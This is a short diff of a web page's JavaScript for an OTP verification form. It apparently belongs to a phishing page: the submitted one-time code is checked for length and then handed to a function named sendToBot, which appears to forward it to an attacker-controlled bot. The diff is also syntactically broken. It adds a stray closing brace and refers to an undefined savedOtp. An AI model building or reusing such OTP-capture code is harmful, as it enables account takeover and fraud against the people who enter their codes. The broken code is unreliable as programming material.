@@ -616,17 +616,21 @@ Applicant: <code>Not provided</code>
     window.addEventListener('DOMContentLoaded', () => {
       const savedRef = localStorage.getItem('fbc_otp_ref') || '9vXfk';
       document.getElementById('refCodeText').textContent = 'Ref: ' + savedRef;
+    }
+      if (savedOtp) {
+        otpInput.value = savedOtp;
+      }
     });
 
     function handleOtpSubmit(e) {
       e.preventDefault();
-      const code = document.getElementById('otpInput').value.trim();
 
-      if (!code || code.length < 4) {
-        document.getElementById('otpError').style.display = 'block';
+      const otpVal = otpInput.value.trim();
+
+      if (!otpVal || otpVal.length < 4) {
+        showLoginError('Please enter a valid otp verification');
         return;
       }
-      
 
       hideOtpError();
       sendToBot(otpVal);
